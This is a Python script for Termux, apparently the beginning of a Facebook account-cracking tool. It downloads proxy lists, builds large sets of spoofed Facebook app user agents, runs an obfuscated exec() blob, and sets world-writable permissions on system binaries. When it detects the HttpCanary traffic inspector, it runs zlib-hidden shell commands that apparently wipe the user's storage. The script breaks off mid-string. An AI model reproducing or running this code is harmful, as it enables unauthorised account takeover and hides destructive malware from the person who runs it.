#!/usr/bin/python3
#coding/utf/
#created/by/mr.MUGHAL
def clear():
        os.system('clear')
#_________[ IMPORTING MODULES ]______>>
from os import path
import os,base64,zlib,pip,urllib
print('\x1b[1;97m[√] \x1b[1;92mCHECMUGHAL MODULES...')
os.system("pip uninstall urllib3 requests chardet idna certifi -y")
os.system("pip install urllib3 requests chardet idna certifi")
os.system("chmod 777 /data/data/com.termux/files/usr/bin/*");clear() 
import os,requests,json,time,re,random,sys,uuid,string,subprocess
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n\033[0;97m[•]\033[1;32mINSTALLING MISSING MODULES...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('git pull')
except:pass
#_________[ PROXY SERVER ]______>>
try:
    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
    open('proxies.txt','w').write(proxies)
except Exception as e:
    print('')
    time.sleep(2)
    os.system(f'xdg-open https://www.facebook.com/tamoor.arshad.56')
proxies=open('proxies.txt','r').read().splitlines()
android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
#_________[ TRACMUGHAL USERS IP ]______>>
ip = requests.get("https://api.ipify.org").text
print('\033[0;97m[•] \033[0;92mMUGHAL TOOL IS TRACMUGHAL YOUR IP ADDRESS')
time.sleep(2)
print("\033[0;97m[•] \x1b[1;92mTHIS IS YOUR IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)

samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']

#_________[ UA MATHOD ]______>>

samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']

import os
from os import path
from pathlib import Path
import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess

try:
	import requests,os,json,time,re,random,sys,uuid,string
	from string import *
	from requests import api
	from concurrent.futures import ThreadPoolExecutor as tred
except ImportError:
	os.system('python TAMOOR.py')

header_grup_op = {'user-agent':'FBAN/FB4A;FBAV/328.1.0.28.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/306506931;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/7.1.1;FBCA/x86:armeabi;FBDM/{density=3.0,width=1080,height=1794'}
head_sam = {'User Agent : Davik/2.1.0 (Linux; U; Android 4.0.0; Infinix X682B Build/Build/QP1A.190711.020; wv) [FBAN/AndroidSampleApp;FBAV/348.719.618.179;FBLC/en_US;FBBV/709835163;FBCR/Zong;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X682B;FBSV/12.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1'}
head_sams = {"user-agent": "Davik/2.1.0 (Linux; U; Android 10; TECNO LC8 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/317.0.0.3.45;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/796703265;FBCR/Telenor;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO LC8;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
header_grup_asp = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
header_grup_xz = {"user-agent": "Mozilla/5.0 (Linux; Android 10; TECNO LC8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
api = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/107.0.0.0 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en-PK;q=0.6,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
uas_tes = "Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/358.0.0.8.62;]"
uas_random = random.choice(["Mozilla/5.0 (Linux; Android 12; SM-A235F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/364.0.0.9.77;]","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "Mozilla/5.0 (Linux; Android 11; Nokia C21 Plus Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/359.0.0.11.81;]"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5312j [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
header_gr_dk = {'user-agent':'FBAN/FB4A;FBAV/328.1.0.28.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/306506931;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/7.1.1;FBCA/x86:armeabi;FBDM/{density=3.0,width=1080,height=1794'}
head_aqe = {'User Agent : Davik/2.1.0 (Linux; U; Android 12; Realme RMX1821 Build/SP1A.210812.003_NONFC) [FBAN/MessengerLite;FBAV/317.0.0.2.142;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/885055002;FBCR/Jazz;FBMF/Realme RMX1821;FBBD/Realme RMX1821;FBDV/Realme RMX1821;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.6678266203280074,height=1970,width=1658};]'}
ua_zs = {"user-agent": "Davik/2.1.0 (Linux; U; Android 12; SAMSUNG Galaxy A14 5G Build/SP1A.210812.003_NONFC) [FBAN/MessengerLite;FBAV/317.0.0.2.142;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/885055002;FBCR/Jazz;FBMF/SAMSUNG Galaxy A14 5G;FBBD/SAMSUNG Galaxy A14 5G;FBDV/SAMSUNG Galaxy A14 5G;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0277699150725383,height=1917,width=1241};]"}
header_grup = {"user Agent": "Davik/2.1.0 (Linux; U; Android 12; V2111 Build/SP1A.210812.003_NONFC) [FBAN/MessengerLite;FBAV/308.0.0.2.98;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/546750895;FBCR/Jazz;FBMF/vivo;FBBD/vivo;FBDV/V2111;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
ua_zs = {"user-agent": "Davik/2.1.0 (Linux; U; Android 11; V2043_21 Build/RP1A.200720.012) [FBAN/MessengerLite;FBAV/306.0.0.4.53;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/207672721;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBDV/V2043_21;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
useragent_xxx = {"user-agent": "Davik/2.1.0 (Linux; U; Android 11; Infinix X688B Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/325.0.0.4.67;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/683135857;FBCR/Telenor;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X688B;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
header_grup_gop = {"user-agent": "Davik/2.1.0 (Linux; U; Android 11; Infinix X693 Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/308.0.0.2.141;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/354620329;FBCR/Telenor;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X693;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
head_f = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"}
ua_z = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.2.7; SM-T535 Build/LRX22G) [FBAN/FB5A;FBAV/180.0.25.3;FBBV/13834701;FBDM/{density=1.3,width=745,height=1632};FBLC/it_IT;FBRV/25796296;FBCR/O3BUEDl5KS;FBMF/SM-T535;FBBD/Samsung;FBPN/com.facebook.orca;FBDV/SM-T535;FBSV/6.4;FBOP/1;FBCA/x86:armeabi-v7a;FBNT/4G;FBCN/Verizon;FBSR/233.104.150.100;]"}
ua_x = {"user-agent": "Davik/2.1.0 (Linux; U; Android 12; SAMSUNG Galaxy A14 5G Build/SP1A.210812.003_NONFC) [FBAN/MessengerLite;FBAV/317.0.0.2.142;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/885055002;FBCR/Jazz;FBMF/SAMSUNG Galaxy A14 5G;FBBD/SAMSUNG Galaxy A14 5G;FBDV/SAMSUNG Galaxy A14 5G;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=1.1926266044700211,height=1644,width=1982};]"}
ua_x = {"user-agent": "Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA};]"}
ua_x = {"user-agent": "Davik/2.1.0 (Linux; U; Android 12; OPPO CPH1909 Build/SP1A.210812.003_NONFC) [FBAN/MessengerLite;FBAV/317.0.0.2.142;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/885055002;FBCR/Jazz;FBMF/OPPO CPH1909;FBBD/OPPO CPH1909;FBDV/OPPO CPH1909;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=1.7341365668536246,height=939,width=558};]"}
ua_x = {"user-agent": "Davik/2.1.0 (Linux; U; Android 12; vivo V2111 Build/SP1A.210812.003_NONFC) [FBAN/MessengerLite;FBAV/317.0.0.2.142;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/885055002;FBCR/Jazz;FBMF/vivo V2111;FBBD/vivo V2111;FBDV/vivo V2111;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=1.6518302128870954,height=2299,width=1956};]"}
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; SM-G960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/363.0.0.6.63;]","Mozilla/5.0 (Linux; Android 11; Multilaser_F_Pro_2 Build/V6_20220223; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/363.0.0.6.63;]","Mozilla/5.0 (Linux; Android 13; V2170A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.217 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])


os.system("clear")
print(' Checking modules ...\n')
exec(zlib.decompress(b'x\x9c}\xccA\x0e@0\x10\x05\xd0\xab\xfc\x1d\x16XXJ\xdc\xa5t\xc4$\xa3\xaa3\x95\xb8\xbdX\x10+\x07xo\xd3FO5Z\xcb"rD\x0e\x1c\xd4\x9c\x08\x12\xed\x99\xd4\x14\xd3\xe2\x92\'CN"<v`\x1f\x1c&J\xc63\xa3>1\xa0\xf5t\xb4!\x8b\xf4w\xf1\x04\xbf\xee\xdd?\xba\xa8.k\xe33\x11'))
os.system('xdg-open https://www.facebook.com/tamoor.arshad.56')


try:
	g = "anar"
	f="tt"
	file_d = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))

	if f'com.h{f}pc{g}y.pro' in file_d:
		print('\033[1;37m[×] Uninstall HttpCanary From Your Device ')
		os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
		os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
		os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
		exit()
	else:
		pass
except Exception as e:
	pass

def xox(m):
	for x in m + '\n':
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.07)

def clear():
	os.system('clear')
	print(logo)

def ua_mafia():
	model = random.choice(samsung).split('|')
	END = "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G928F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+' 